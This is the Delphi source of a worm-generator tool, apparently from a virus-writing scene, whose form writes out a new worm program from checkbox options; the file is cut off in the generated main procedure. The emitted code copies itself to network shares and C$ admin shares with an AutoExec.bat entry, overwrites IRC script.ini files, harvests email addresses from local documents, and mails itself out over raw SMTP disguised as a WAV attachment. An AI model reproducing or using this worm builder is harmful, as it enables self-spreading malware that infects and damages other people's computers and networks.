unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Panel1: TPanel;
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    Edit2: TEdit;
    Button1: TButton;
    Button2: TButton;
    Panel2: TPanel;
    Panel3: TPanel;
    Label3: TLabel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    Panel4: TPanel;
    Button3: TButton;
    Button4: TButton;
    Label4: TLabel;
    Edit3: TEdit;
    Label5: TLabel;
    Edit4: TEdit;
    Memo1: TMemo;
    Memo2: TMemo;
    Panel5: TPanel;
    Button5: TButton;
    CheckBox5: TCheckBox;
    Memo3: TMemo;
    Edit5: TEdit;
    Label6: TLabel;
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure CheckBox5MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Button5Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
begin
if panel1.Visible then begin
 panel1.Visible := false;
 panel2.Visible := true;
 exit;
end;

if panel2.Visible then begin
 panel2.Visible := false;
 panel5.Visible := true;
 exit;
end;

if panel3.Visible then begin
 panel3.Visible := false;
 panel2.Visible := true;
 exit;
end;

if panel4.Visible then begin
 panel4.Visible := false;
 panel2.Visible := true;
 exit;
end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
panel1.Visible := true;
panel2.Visible := false;
panel3.Visible := false;
panel4.Visible := false;
panel5.Visible := false;
panel2.Top := 0;
panel2.Left := 0;
panel3.Top := 0;
panel3.Left := 0;
panel4.Top := 0;
panel4.Left := 0;
panel5.Top := 0;
panel5.Left := 0;

end;

procedure TForm1.Button2Click(Sender: TObject);
begin
if panel2.Visible then begin
 panel2.Visible := false;
 panel1.Visible := true;
 exit;
end;

if panel3.Visible then begin
 panel3.Visible := false;
 panel2.Visible := true;
 exit;
end;

if panel4.Visible then begin
 panel4.Visible := false;
 panel2.Visible := true;
 exit;
end;

if panel5.Visible then begin
 panel5.Visible := false;
 panel2.Visible := true;
 exit;
end;

end;

procedure TForm1.Button3Click(Sender: TObject);
begin
panel3.Visible := true;
panel2.Visible := false;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
panel4.Visible := true;
panel2.Visible := false;
end;

procedure TForm1.CheckBox5MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 If CheckBox5.Checked Then Button5.Enabled := True Else Button5.Enabled := False;
end;

procedure TForm1.Button5Click(Sender: TObject);
var
 _Out   :TextFile;
 I      :Integer;
begin

 AssignFile( _Out, Edit2.Text + Edit1.text+'.dpr' );
 ReWrite( _Out );
 WriteLn( _Out, 'Program '+Edit1.text+';');
 WriteLn( _Out );
 If CheckBox2.Checked Then
  WriteLn( _Out, 'Uses Windows, Winsock;')
 Else
  WriteLn( _Out, 'Uses Windows;');

 If CheckBox2.Checked Then Begin
  WriteLn( _Out , ' TYPE');
  WriteLn( _Out , '   Triple = ARRAY[1..3] OF BYTE;');
  WriteLn( _Out , '   Quad   = ARRAY[1..4] OF BYTE;');
 End;

 WriteLn( _out);
 WriteLn( _Out , '// Message');
 WriteLn( _Out , 'Const');
 WriteLn( _Out , ' Mess : String = ''This is '+edit1.text+' worm'';');
 WriteLn( _out);

 If (CheckBox1.Checked) Or (CheckBox2.Checked) Then
 WriteLn( _Out , 'Var');
 If CheckBox1.Checked Then Begin
  WriteLn( _Out , '// Network string');
  WriteLn( _Out, ' Domains      : String;');
 End;
 If CheckBox2.Checked Then Begin
  WriteLn( _Out , '// Mail String');
  WriteLn( _Out , ' Mails        : String;');
  WriteLn( _Out , '//Base 64 Encode');
  WriteLn( _Out , ' Buf          : Array[0..255] Of Char;');
  WriteLn( _Out , ' FileBuf      : Array[0..1000000] Of Byte;');
  WriteLn( _Out , ' CC           : String = ''ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='';');
 End;
 WriteLn( _Out );
 WriteLn( _Out , ' // Lowercase Function.' );
 WriteLn( _Out , ' Function LowerCase(const S: string): string;');
 WriteLn( _Out , ' var');
 WriteLn( _Out , '  Len: Integer;');
 WriteLn( _Out , ' begin');
 WriteLn( _Out , '  Len := Length(S);');
 WriteLn( _Out , '  SetString(Result, PChar(S), Len);');
 WriteLn( _Out , '  if Len > 0 then CharLowerBuff(Pointer(Result), Len);');
 WriteLn( _Out , ' end;');
 WriteLn( _Out );
 WriteLn( _Out , ' Function FileSize(FileName: String): Int64;');
 WriteLn( _Out , ' Var');
 WriteLn( _Out , '   H: THandle;');
 WriteLn( _Out , '   FData: TWin32FindData;');
 WriteLn( _Out , ' Begin');
 WriteLn( _Out , '   Result:= -1;');
 WriteLn( _Out );
 WriteLn( _Out , '   H:= FindFirstFile(PChar(FileName), FData);');
 WriteLn( _Out , '   If H <> INVALID_HANDLE_VALUE Then');
 WriteLn( _Out , '   Begin');
 WriteLn( _Out , '     Windows.FindClose(H);');
 WriteLn( _Out , '     Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;');
 WriteLn( _Out , '   End;');
 WriteLn( _Out , ' End;');
 WriteLn( _Out );
 WriteLn( _Out , ' Function ExtractFileName(Str:String):String;');
 WriteLn( _Out , ' Begin');
 WriteLn( _Out , '  While Pos(''\'', Str)>0 Do');
 WriteLn( _Out , '   Str := Copy(Str, Pos(''\'',Str)+1, Length(Str));');
 WriteLn( _Out , '  Result := Str;');
 WriteLn( _Out , ' End;');
 WriteLn( _Out );
 WriteLn( _Out , ' // FileExists Function.');
 WriteLn( _Out , ' function FileExists(const FileName: string): Boolean;');
 WriteLn( _Out , ' var');
 WriteLn( _Out , '   Handle: THandle;');
 WriteLn( _Out , '   FindData: TWin32FindData;');
 WriteLn( _Out , ' begin');
 WriteLn( _Out , '   Handle := FindFirstFileA(PChar(FileName), FindData);');
 WriteLn( _Out , '   result:= Handle <> INVALID_HANDLE_VALUE;');
 WriteLn( _Out , '   if result then');
 WriteLn( _Out , '   begin');
 WriteLn( _Out , '     CloseHandle(Handle);');
 WriteLn( _Out , '   end;');
 WriteLn( _Out , ' end;');
 WriteLn( _Out );
 If CheckBox1.Checked Then Begin
  WriteLn( _Out , ' // Network Spread Function' );
  WriteLn( _Out , ' procedure Enumeration(aResource:PNetResource);');
  WriteLn( _Out , ' var');
  WriteLn( _Out , '    aHandle: THandle;');
  WriteLn( _Out , '    k, BufferSize: DWORD;');
  WriteLn( _Out , '    Buffer: array[0..1023] of TNetResource;');
  WriteLn( _Out , '    i: Integer;');
  WriteLn( _Out , ' begin');
  WriteLn( _Out , '    WNetOpenEnum(2,0,0,aResource,aHandle);');
  WriteLn( _Out , '    k:=1024;');
  WriteLn( _Out , '    BufferSize:=SizeOf(Buffer);');
  WriteLn( _Out , '    while WNetEnumResource(aHandle,k,@Buffer,BufferSize)=0 do');
  WriteLn( _Out , '    for i:=0 to k-1 do');
  WriteLn( _Out , '    begin');
  WriteLn( _Out , '     if Buffer[i].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then');
  WriteLn( _Out , '      // Put all found domains in DOMAINS string. public declared.');
  WriteLn( _Out , '      Domains := Domains + copy(LowerCase(Buffer[i].lpRemoteName),3,MAX_PATH) + #13#10;');
  WriteLn( _Out , '     if Buffer[i].dwUsage>0 then');
  WriteLn( _Out , '   Enumeration(@Buffer[i])');
  WriteLn( _Out , '  end;');
  WriteLn( _Out , '    WNetCloseEnum(aHandle);');
  WriteLn( _Out , ' end;');
  WriteLn( _Out );
  WriteLn( _Out , ' // Here is the main procedure.');
  WriteLn( _Out , ' Procedure Network;');
  WriteLn( _Out , ' Var');
  WriteLn( _Out , '  Name : String;');
  WriteLn( _Out , '  Auto : TextFile;');
  WriteLn( _Out , ' Begin');
  WriteLn( _Out , '  // first of course enumerate the domains.');
  WriteLn( _Out , '  Enumeration(NIL);');
  WriteLn( _Out , '  // while domains aint NOTHING we grab out domains. (look liks : NAME#13#10NAME#13#10) :D');
  WriteLn( _Out , '  While Domains <> '''' Do Begin');
  WriteLn( _Out , '   // strip out name');
  WriteLn( _Out , '   Name := Copy(Domains, 1, Pos(#13#10, Domains)-1);');
  WriteLn( _Out , '   // try, MIGHT fuck so better TRY.');
  WriteLn( _Out , '   Try');
  WriteLn( _Out , '    // COPY TO C!!');
  WriteLn( _Out , '    CopyFile(pChar(ParamStr(0)), pChar(Name + ''\C$\Setup.exe''), False);');
  WriteLn( _Out , '    // modify autoexec so it launches setup.exe automaticly');
  WriteLn( _Out , '    If FileExists(pChar(Name + ''\C$\AutoExec.bat'')) Then Begin');
  WriteLn( _Out , '     AssignFile(Auto, Name + ''\C$\AutoExec.bat'');');
  WriteLn( _Out , '     Append(Auto);');
  WriteLn( _Out , '     WriteLn(Auto, ''Setup.exe'');');
  WriteLn( _Out , '     CloseFile(Auto);');
  WriteLn( _Out , '    // where done, so lets go');
  WriteLn( _Out , '    End;');
  WriteLn( _Out , '   Except');
  WriteLn( _Out , '    ;');
  WriteLn( _Out , '   End;');
  WriteLn( _Out , '   Domains := Copy(Domains, Pos(#13#10, Domains)+2, Length(Domains));');
  WriteLn( _Out , '  End;');
  WriteLn( _Out , ' End;');
 End;

 If CheckBox3.Checked Then Begin
  If Memo2.text <> '' Then Begin
  While Pos('%file%', Memo2.text)>0 Do Begin
   Memo2.text := Copy(Memo2.text, 1, Pos('%file%', Memo2.text)-1)+
                 '"''+ParamStr(0)+''"' +
                 Copy(Memo2.text, Pos('%file%', Memo2.text)+6, Length(Memo2.text));
  End;
  WriteLn( _Out , ' // Irc Script infect');
  WriteLn( _Out , ' Procedure InfectIrc(F	:String);');
  WriteLn( _Out , ' Var');
  WriteLn( _Out , '  Irc: TextFile;');
  WriteLn( _Out , ' Begin');
  WriteLn( _Out , '  AssignFile(Irc, F);');
  WriteLn( _Out , '  ReWrite(Irc);');
  For I := 0 To memo2.Lines.Count -1 Do
   WriteLn( _Out , '  WriteLn(Irc, '''+Memo2.Lines.Strings[i]+''');');
  WriteLn( _Out , '  CloseFile(Irc);');
  WriteLn( _Out , ' End;');
  End;
 End;

 If CheckBox2.Checked Then Begin
  WriteLn( _Out , ' // Base64 Encode Written By Positron');
  WriteLn( _Out , ' // MailSend Written By p0ke');

  WriteLn( _Out , ' FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;');
  WriteLn( _Out , ' VAR');
  WriteLn( _Out , '   Q    : Quad;');
  WriteLn( _Out , '   Strg : STRING;');
  WriteLn( _Out , ' BEGIN');
  WriteLn( _Out , '   IF Count<3 THEN BEGIN');
  WriteLn( _Out , '     T[3]:=0;');
  WriteLn( _Out , '     Q[4]:=64;');
  WriteLn( _Out , '   END ELSE Q[4]:=(T[3] AND $3F);');
  WriteLn( _Out , '   IF Count<2 THEN BEGIN');
  WriteLn( _Out , '     T[2]:=0;');
  WriteLn( _Out , '     Q[3]:=64;');
  WriteLn( _Out , '   END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);');
  WriteLn( _Out , '   Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);');
  WriteLn( _Out , '   Q[1]:=((T[1] SHR 2) AND $3F);');
  WriteLn( _Out , '   Strg:='''';');
  WriteLn( _Out , '   FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);');
  WriteLn( _Out , '   RESULT:=Strg;');
  WriteLn( _Out , ' END;');
  WriteLn( _Out );
  WriteLn( _Out , ' FUNCTION BASE64(DataLength:DWORD) : AnsiString;');
  WriteLn( _Out , ' VAR');
  WriteLn( _Out , '   B      : AnsiString;');
  WriteLn( _Out , '   I      : DWORD;');
  WriteLn( _Out , '   Remain : DWORD;');
  WriteLn( _Out , '   Trip   : Triple;');
  WriteLn( _Out , '   Count  : WORD;');
  WriteLn( _Out , ' BEGIN');
  WriteLn( _Out , '   Count:=0;');
  WriteLn( _Out , '   B:='''';');
  WriteLn( _Out , '   FOR I:=1 TO DataLength DIV 3 DO BEGIN');
  WriteLn( _Out , '     INC(Count,4);');
  WriteLn( _Out , '     Trip[1]:=Ord(FileBuf[(I-1)*3+1]);');
  WriteLn( _Out , '     Trip[2]:=Ord(FileBuf[(I-1)*3+2]);');
  WriteLn( _Out , '     Trip[3]:=Ord(FileBuf[(I-1)*3+3]);');
  WriteLn( _Out , '     B:=B+codeb64(3,Trip);');
  WriteLn( _Out , '     IF Count=76 THEN BEGIN');
  WriteLn( _Out , '       B:=B+#13#10;');
  WriteLn( _Out , '       Count:=0;');
  WriteLn( _Out , '     END;');
  WriteLn( _Out , '   END;');
  WriteLn( _Out , '   Remain:=DataLength-(DataLength DIV 3)*3;');
  WriteLn( _Out , '   IF Remain>0 THEN BEGIN');
  WriteLn( _Out , '     Trip[1]:=Ord(FileBuf[DataLength-1]);');
  WriteLn( _Out , '     IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);');
  WriteLn( _Out , '     IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);');
  WriteLn( _Out , '   END;');
  WriteLn( _Out , '   RESULT:=B;');
  WriteLn( _Out , ' END;');
  WriteLn( _Out );
  WriteLn( _Out , ' Procedure SendMail(Recip, From, Server: String);');
  WriteLn( _Out , ' Var');
  WriteLn( _Out , '  Sock             : TSocket;');
  WriteLn( _Out , '  Wsadatas         : TWSADATA;');
  WriteLn( _Out , '  SockAddrIn       : TSockAddrIn;');
  WriteLn( _Out , '  F                : FILE;');
  WriteLn( _Out );
  WriteLn( _Out , ' Procedure Mys(STR:STRING);');
  WriteLn( _Out , ' Begin');
  WriteLn( _Out , '  Send(Sock,STR[1],Length(STR),0);');
  WriteLn( _Out , ' End;');
  WriteLn( _Out );
  WriteLn( _Out , ' Begin');
  WriteLn( _Out , ' // First try to connect to server.');
  WriteLn( _Out );
  WriteLn( _Out , ' // Startup');
  WriteLn( _Out , ' WSAStartUp(257,wsadatas);');
  WriteLn( _Out , ' // Set Socket');
  WriteLn( _Out , ' Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);');
  WriteLn( _Out , ' // Set settings for socket');
  WriteLn( _Out , ' SockAddrIn.sin_family:=AF_INET;');
  WriteLn( _Out , ' // Set port, in this case 25');
  WriteLn( _Out , ' SockAddrIn.sin_port:=htons(25);');
  WriteLn( _Out , ' // Set address, in this case "Server"');
  WriteLn( _Out , ' SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(Server));');
  WriteLn( _Out , ' // Try to connect');
  WriteLn( _Out , ' If Connect(Sock,SockAddrIn,SizeOf(SockAddrIn)) <> SOCKET_ERROR Then Begin');
  WriteLn( _Out , '  // YAY, no errors. Lets go.');
  WriteLn( _Out );
  WriteLn( _Out , '  // Hello Server');
  WriteLn( _Out , '  Mys(''HELO .com''+#13#10);');
  WriteLn( _Out , '  // I want to send from "FROM"');
  WriteLn( _Out , '  Mys(''MAIL FROM: ''+From+#13#10);');
  WriteLn( _Out , '  // Recip is my victim :)');
  WriteLn( _Out , '  Mys(''RCPT TO: ''+recip+#13#10);');
  WriteLn( _Out , '  // Data, Data, Data, Data');
  WriteLn( _Out , '  Mys(''DATA''+#13#10);');
  WriteLn( _Out , '  // From. ME!');
  WriteLn( _Out , '  Mys(''From: ''+From+#13#10);');
  WriteLn( _Out , '  // My Subject');
  WriteLn( _Out , '  Mys(''Subject: '+Edit3.text+'''+#13#10);');
  WriteLn( _Out , '  // Recip. YOU!');
  WriteLn( _Out , '  Mys(''To: ''+Recip+#13#10);');
  WriteLn( _Out , '  // MIME-VERSION 6.66');
  WriteLn( _Out , '  Mys(''MIME-Version: 1.0''+#13#10);');
  WriteLn( _Out , '  // Lets Call It ShutFace');
  WriteLn( _Out , '  Mys(''Content-Type: multipart/mixed; boundary="ShutFace"''+#13#10+#13#10);');
  WriteLn( _Out , '  // START SHUTFACE');
  WriteLn( _Out , '  Mys(''--ShutFace''+#13#10);');
  WriteLn( _Out , '  // Text/Plain/Boring/FuckOff');
  WriteLn( _Out , '  Mys(''Content-Type: text/plain; charset:us-ascii''+#13#10+#13#10);');
  WriteLn( _Out , '  // Omg, BODY!');
  For I := 0 To Memo1.Lines.Count -1 Do
   WriteLn( _Out , '  Mys('''+Memo1.Lines.Strings[i]+'''+#13#10);');
  WriteLn( _Out , '  Mys(#13#10+#13#10);');
  WriteLn( _Out , '  // Stop ShutFace!');
  WriteLn( _Out , '  Mys(''--ShutFace''+#13#10);');
  WriteLn( _Out , '  // Lets use a old old old, OOOOLD exploit in outlook. the AUDIO exploit :)');
  WriteLn( _Out , '  Mys(''Content-Type: audio/x-wav;''+#13#10);');
  WriteLn( _Out , '  // "Yes yes.. its a .. audio file *cough*"');
  WriteLn( _Out , '  // Name of Attachment');
  WriteLn( _Out , '  Mys(''    name="'+Edit4.text+'"''+#13#10);');
  WriteLn( _Out , '  // What kind of encode ? BASE64 ? OMG !OK !');
  WriteLn( _Out , '  Mys(''Content-Transfer-Encoding: base64''+#13#10+#13#10);');
  WriteLn( _Out , '  // Lets open us-self :)');
  WriteLn( _Out , '  AssignFile(F,ParamStr(0));');
  WriteLn( _Out , '  // FileMode := 0;  UserLevel := 0;  n00bwarning := 4;');
  WriteLn( _Out , '  FileMode:=0;');
  WriteLn( _Out , '  {$I-}');
  WriteLn( _Out , '  Reset(F,1);');
  WriteLn( _Out , '  IF IOResult=0 THEN BEGIN');
  WriteLn( _Out , '   // READ THAT SHIT');
  WriteLn( _Out , '   BlockRead(F,FileBuf[1],FileSize(ParamStr(0)));');
  WriteLn( _Out , '   // BASE THAT SHIT');
  WriteLn( _Out , '   Mys(BASE64(FileSize(ParamStr(0))));');
  WriteLn( _Out , '   // SEEEEND THAT SHIT!!');
  WriteLn( _Out , '   // for you who have seen "how high" : Light that shit, Smoke that shit, PASS that shit.');
  WriteLn( _Out , '   CloseFile(F);');
  WriteLn( _Out , '  END;');
  WriteLn( _Out , '  {$I+}');
  WriteLn( _Out , '  // End ShutFace');
  WriteLn( _Out , '  Mys(#13#10+''--ShutFace--''+#13#10+#13#10);');
  WriteLn( _Out , '  // YOU HAVE BEEN DOTTED!');
  WriteLn( _Out , '  Mys(#13#10+''.''+#13#10);');
  WriteLn( _Out , '  // Bye Bye, Cya soon again for next victim.');
  WriteLn( _Out , '  Mys(''QUIT''+#13#10);');
  WriteLn( _Out , ' End;');
  WriteLn( _Out , ' End;');
  WriteLn( _Out );









  WriteLn( _Out , ' //* FIND IRC DIR + SHARE DIRS + EMAILS :)))) *//');
  WriteLn( _Out , ' //* FUNCTION MADE BY SiC (R.I.P) CREDIT HIM IF USE!!! *//');
  WriteLn( _Out , ' //* START *//');
  WriteLn( _Out );
  WriteLn( _Out , ' //* SiC''S Procedure For Grabbing Mails - Start*//');
  WriteLn( _Out );
  WriteLn( _Out , ' Function Grabmails(Filename:string):String;');
  WriteLn( _Out , ' Var');
  WriteLn( _Out , '  F:Textfile;');
  WriteLn( _Out , '  L1,L2,Text:string;');
  WriteLn( _Out , '  MAIL:String;');
  WriteLn( _Out , '  H,E,i, A:Integer;');
  WriteLn( _Out , '  ABC,ABC2:STRING;');
  WriteLn( _Out , ' Label again;');
  WriteLn( _Out , ' begin');
  WriteLn( _Out , '  ABC:=''abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ'';');
  WriteLn( _Out , '  ABC2:=''abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.'';');
  WriteLn( _Out , '  if filesize(filename) > 5000 then exit;');
  WriteLn( _Out , '  CopyFile(Pchar(Filename),pchar(Filename+''_''),false);');
  WriteLn( _Out , '  sleep(300);');
  WriteLn( _Out , '  AssignFile(F,Filename+''_'');');
  WriteLn( _Out , '  try');
  WriteLn( _Out , '   Reset(F);');
  WriteLn( _Out , '  except');
  WriteLn( _Out , '   exit;');
  WriteLn( _Out , '  end;');
  WriteLn( _Out , '  Read(F,L1);');
  WriteLn( _Out , '  ReadLN(F,L2);');
  WriteLn( _Out , '  Text:=L1;');
  WriteLn( _Out , '  While NOt EOF(F) DO BEGIN');
  WriteLn( _Out , '   Read(F,L1);');
  WriteLn( _Out , '   ReadLN(F,L2);');
  WriteLn( _Out , '   Text:=Text+''|''+L1;');
  WriteLn( _Out , '  END;');
  WriteLn( _Out , '  Closefile(F);');
  WriteLn( _Out , '  Deletefile(pchar(Filename+''_''));');
  WriteLn( _Out , '  sleep(200);');
  WriteLn( _Out , '  if copy(text,1,2)=''MZ'' then exit;');
  WriteLn( _Out , '  text:=''|''+text+''|'';');
  WriteLn( _Out , '  result:='''';');
  WriteLn( _Out , ' //Now we gather the informition.');
  WriteLn( _Out , '  AGAIN:');
  WriteLn( _Out , '  IF pos(''@'',Text)>0 then begin');
  WriteLn( _Out , '   A:=Pos(''@'',Text)-1;');
  WriteLn( _Out , '   if a =0 then a := 1;');
  WriteLn( _Out , '   L1 := copy(text,a,1);');
  WriteLn( _Out , '   L2 := copy(text,a+2,1);');
  WriteLn( _Out , '   H := pos(L1,abc);');
  WriteLn( _Out , '   E := pos(L2,abc2);');
  WriteLn( _Out , '   if (H = 0) or (e=0) then begin');
  WriteLn( _Out , '    text:=copy(text,a+1,length(text));');
  WriteLn( _Out , '    goto again;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out , '   While POS(Copy(TExt,a,1),ABC)>0 do begin');
  WriteLn( _Out , '    A:=A-1;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out , '   a := a +1;');
  WriteLn( _Out , '   Mail := copy(Text,a,length(text)); //grab start of mail.');
  WriteLn( _Out , '   Mail := COpy(Mail,1,pos(''@'',mail)+2);');
  WriteLn( _Out , '   i:= pos(MAIL,text)+length(mail);');
  WriteLn( _Out , '   While pos(copy(mail,length(mail),1),ABC2)>0 do begin');
  WriteLn( _Out , '    Mail := mail+copy(text,i,1);');
  WriteLn( _Out , '    i:=i+1;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out , '   if POS(copy(mail,length(mail),1),ABC2)=0 then Mail:=copy(mail,1,length(mail)-1);');
  WriteLn( _Out , '   Result := Result+#13#10+Mail;');
  WriteLn( _Out , '   Text:=copy(text,pos(mail,text)+length(mail),length(text));');
  WriteLn( _Out , '   goto AGAIN;');
  WriteLn( _Out , '  end;');
  WriteLn( _Out );
  WriteLn( _Out , ' end;');
  WriteLn( _Out );
  WriteLn( _Out , ' //* SiC''S Procedure For Grabbing Mails - End*//');
  WriteLn( _Out );
 end;
 If (CheckBox2.Checked) or (CheckBox3.Checked) or (CheckBox4.Checked) Then Begin
  WriteLn( _Out , ' procedure ListFiles(D, Name, SearchName : String);');
  WriteLn( _Out , ' const');
  WriteLn( _Out , '   faReadOnly  = $00000001;');
  WriteLn( _Out , '   faHidden    = $00000002;');
  WriteLn( _Out , '   faSysFile   = $00000004;');
  WriteLn( _Out , '   faVolumeID  = $00000008;');
  WriteLn( _Out , '   faDirectory = $00000010;');
  WriteLn( _Out , '   faArchive   = $00000020;');
  WriteLn( _Out , '   faAnyFile   = $0000003F;');
  WriteLn( _Out );
  WriteLn( _Out , ' type');
  WriteLn( _Out , '   TFileName = type string;');
  WriteLn( _Out , '   TSearchRec = record');
  WriteLn( _Out , '     Time: Integer;');
  WriteLn( _Out , '     Size: Integer;');
  WriteLn( _Out , '     Attr: Integer;');
  WriteLn( _Out , '     Name: TFileName;');
  WriteLn( _Out , '     ExcludeAttr: Integer;');
  WriteLn( _Out , '     FindHandle: THandle  platform;');
  WriteLn( _Out , '     FindData: TWin32FindData  platform;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out );
  WriteLn( _Out , '   LongRec = packed record');
  WriteLn( _Out , '     case Integer of');
  WriteLn( _Out , '       0: (Lo, Hi: Word);');
  WriteLn( _Out , '       1: (Words: array [0..1] of Word);');
  WriteLn( _Out , '       2: (Bytes: array [0..3] of Byte);');
  WriteLn( _Out , '   end;');
  WriteLn( _Out );
  WriteLn( _Out , '   function FindMatchingFile(var F: TSearchRec): Integer;');
  WriteLn( _Out , '   var');
  WriteLn( _Out , '     LocalFileTime: TFileTime;');
  WriteLn( _Out , '   begin');
  WriteLn( _Out , '     with F do');
  WriteLn( _Out , '     begin');
  WriteLn( _Out , '       while FindData.dwFileAttributes and ExcludeAttr <> 0 do');
  WriteLn( _Out , '         if not FindNextFile(FindHandle, FindData) then');
  WriteLn( _Out , '         begin');
  WriteLn( _Out , '           Result := GetLastError;');
  WriteLn( _Out , '           Exit;');
  WriteLn( _Out , '         end;');
  WriteLn( _Out , '       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);');
  WriteLn( _Out , '       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,');
  WriteLn( _Out , '         LongRec(Time).Lo);');
  WriteLn( _Out , '       Size := FindData.nFileSizeLow;');
  WriteLn( _Out , '       Attr := FindData.dwFileAttributes;');
  WriteLn( _Out , '       Name := FindData.cFileName;');
  WriteLn( _Out , '     end;');
  WriteLn( _Out , '     Result := 0;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out );
  WriteLn( _Out , '   procedure FindClose(var F: TSearchRec);');
  WriteLn( _Out , '   begin');
  WriteLn( _Out , '     if F.FindHandle <> INVALID_HANDLE_VALUE then');
  WriteLn( _Out , '     begin');
  WriteLn( _Out , '       Windows.FindClose(F.FindHandle);');
  WriteLn( _Out , '       F.FindHandle := INVALID_HANDLE_VALUE;');
  WriteLn( _Out , '     end;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out );
  WriteLn( _Out , '   function FindFirst(const Path: string; Attr: Integer;');
  WriteLn( _Out , '     var  F: TSearchRec): Integer;');
  WriteLn( _Out , '   const');
  WriteLn( _Out , '     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;');
  WriteLn( _Out , '   begin');
  WriteLn( _Out , '     F.ExcludeAttr := not Attr and faSpecial;');
  WriteLn( _Out , '     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);');
  WriteLn( _Out , '     if F.FindHandle <> INVALID_HANDLE_VALUE then');
  WriteLn( _Out , '     begin');
  WriteLn( _Out , '       Result := FindMatchingFile(F);');
  WriteLn( _Out , '       if Result <> 0 then FindClose(F);');
  WriteLn( _Out , '     end else');
  WriteLn( _Out , '       Result := GetLastError;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out );
  WriteLn( _Out , '   function FindNext(var F: TSearchRec): Integer;');
  WriteLn( _Out , '   begin');
  WriteLn( _Out , '     if FindNextFile(F.FindHandle, F.FindData) then');
  WriteLn( _Out , '       Result := FindMatchingFile(F) else');
  WriteLn( _Out , '       Result := GetLastError;');
  WriteLn( _Out , '   end;');
  WriteLn( _Out );
  WriteLn( _Out , ' var');
  WriteLn( _Out , '   SR: TSearchRec;');
  WriteLn( _Out , '   ext, Fn : string;');
  WriteLn( _Out , ' begin');
  WriteLn( _Out , '   If D[Length(D)] <> ''\'' then D := D + ''\'';');
  WriteLn( _Out );
  WriteLn( _Out , '   If FindFirst(D + ''*.*'', faDirectory, SR) = 0 then');
  WriteLn( _Out , '     Repeat');
  WriteLn( _Out , '       If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> ''.'') then');
  WriteLn( _Out , '         ListFiles(D + SR.Name + ''\'', Name, SearchName)');
  WriteLn( _Out , '       Else Begin');
  WriteLn( _Out , '       //* HERE; IF ITS NOT A DIRECTORY THEN ITS A FILE.');
  WriteLn( _Out , '        fn := LowerCase(Sr.Name);                                       // grab name');
  WriteLn( _Out , '        Ext := LowerCase(Copy(FN, length(FN)-2, 3));                    // grab extension :)');
  WriteLn( _Out );
       If CheckBox2.Checked Then Begin
  WriteLn( _Out , '         If Ext = ''txt'' then Mails := Mails + GrabMails(D + Sr.Name);');
  WriteLn( _Out , '         If Ext = ''htm'' then Mails := Mails + GrabMails(D + Sr.Name);');
  WriteLn( _Out , '         If Ext = ''tml'' then Mails := Mails + GrabMails(D + Sr.Name);');
  WriteLn( _Out , '         If Ext = ''doc'' then Mails := Mails + GrabMails(D + Sr.Name);');
       End;
       If CheckBox3.Checked Then
  WriteLn( _Out , '         If Fn = ''script.ini'' Then InfectIrc(D + Sr.Name);');
       If CheckBox4.Checked Then Begin
  WriteLn( _Out , '         If Pos(''share'', ExtractFileName(Copy(D, 1, Length(D)-1)))>0 Then CopyFile(pChar(ParamStr(0)), pChar(D+''Setup.exe''), False);');
  WriteLn( _Out , '         If Pos(''sharing'', ExtractFileName(Copy(D, 1, Length(D)-1)))>0 Then CopyFile(pChar(ParamStr(0)), pChar(D+''Setup.exe''), False);');
       End;
  WriteLn( _Out , '        End;');
  WriteLn( _Out , '     Until (FindNext(SR) <> 0);');
  WriteLn( _Out , '   FindClose(SR);');
  WriteLn( _Out , ' end;');
  WriteLn( _Out );
  WriteLn( _Out , ' //* END *//');
  WriteLn( _Out , ' //* FIND IRC DIR + SHARE DIRS + EMAILS :)))) *//');
  WriteLn( _Out , ' //* FUNCTION MADE BY SiC (R.I.P) CREDIT HIM IF USE!!! *//');
 End;

  WriteLn( _Out , ' Begin');
  If CheckBox1.checked Then Begin
   WriteLn( _Out , '  // Infect Network');
   WriteLn( _Out , '  NetWork;');
  End;
